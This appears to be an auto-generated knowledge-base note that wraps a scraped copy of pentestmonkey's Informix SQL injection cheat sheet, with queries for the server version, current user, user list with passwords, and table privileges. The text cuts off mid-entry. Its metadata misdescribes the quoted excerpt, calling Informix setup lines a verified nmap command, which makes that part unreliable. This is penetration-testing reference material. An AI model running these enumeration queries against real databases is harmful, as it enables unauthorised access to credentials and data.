---
title: "Trained Knowledge & Topology: informix-sql-injection-cheat-sheet.html"
tags:
  - html
  - initial_access_exploitation
  - mdp
  - nmap
  - trained
source_file: informix-sql-injection-cheat-sheet.html
doc_type: html
updated: 2026-10-24 00:58:35
---

# Trained Knowledge & Architecture: `informix-sql-injection-cheat-sheet.html`

- **Source Path:** `~/Projects/CORA/Training/informix-sql-injection-cheat-sheet.html` (`html`)
- **Extracted Technical Entities:** `nmap`
- **Extracted IPs / Subnets:** `10.0.0.1`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_informix-sql-injection-cheat-sheet]] (`1` CEGAR-verified commands | `1` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `1` (full executable list in [[commands/trained_informix-sql-injection-cheat-sheet]])
- **Tactic Distribution:** `Initial_Access_Exploitation` (1)
- **Top Extracted CLI Tools:** `nmap` (1)

## Extracted Reference Excerpt
```bash
set INFORMIXDIR=C:PROGRA~1IBMIBMINF~111.50
set INFORMIXSERVER=testservername
set ONCONFIG=ONCONFIG.testservername
set PATH=C:PROGRA~1IBMIBMINF~111.50bin;C:WINDOWSsystem32;C:WINDOWS;C:WINDOWSSystem32Wbem;C:PROGRA~1ibmgsk7bin;C:PROGRA~1ibmgsk7lib;C:Program FilesIBMInformixClien-SDKbin;C:Program Filesibmgsk7bin;C:Program Filesibmgsk7lib
set CLASSPATH=C:PROGRA~1IBMIBMINF~111.50extendkrakatoakrakatoa.jar;C:PROGRA~1IBMIBMINF~111.50xtendkrakatoajdbc.jar;
set DBTEMP=C:PROGRA~1IBMIBMINF~111.50infxtmp
set CLIENT_LOCALE=EN_US.CP1252
set DB_LOCALE=EN_US.8859-1
set SERVER_LOCALE=EN_US.CP1252
set DBLANG=EN_US.CP1252
mode con codepage select=1252
```

```bash
Identifying on the network
```









Informix SQL Injection Cheat Sheet | pentestmonkey




















































pentestmonkey


Taking the monkey work out of pentesting












Site News


Blog


Tools


Yaptest


Cheat Sheets


Contact


 


















Informix SQL Injection Cheat Sheet




Some useful syntax reminders for SQL Injection into Informix databases…




Below are some tabulated notes on how to do many of thing you’d normally do via SQL injection.  All tests were performed on Informix Dynamic Server Express Edition 11.5 for Windows.  The Informix download page is 
here
.


This post is part of series of SQL Injection Cheat Sheets.  In this series, I’ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don’t apply and also areas that I haven’t got round to researching yet.


The complete list of SQL Injection Cheat Sheets I’m working is:




Oracle


MSSQL


MySQL


PostgreSQL


Ingres


DB2


Informix




I’m not planning to write one for MS Access, but there’s a great 
MS Access Cheat Sheet here
.








Version


SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1;

SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1;

SELECT DBINFO(‘version’, ‘major’), DBINFO(‘version’, ‘minor’), DBINFO(‘version’, ‘level’) FROM systables WHERE tabid = 1;

SELECT DBINFO(‘version’, ‘os’) FROM systables WHERE tabid = 1; — T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix






Comments


select 1 FROM systables WHERE tabid = 1; — comment






Current User


SELECT USER FROM systables WHERE tabid = 1;

select CURRENT_ROLE FROM systables WHERE tabid = 1;






List Users


select username, usertype, password from sysusers;






List Password Hashes


TODO






List Privileges


select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; — which tables ar

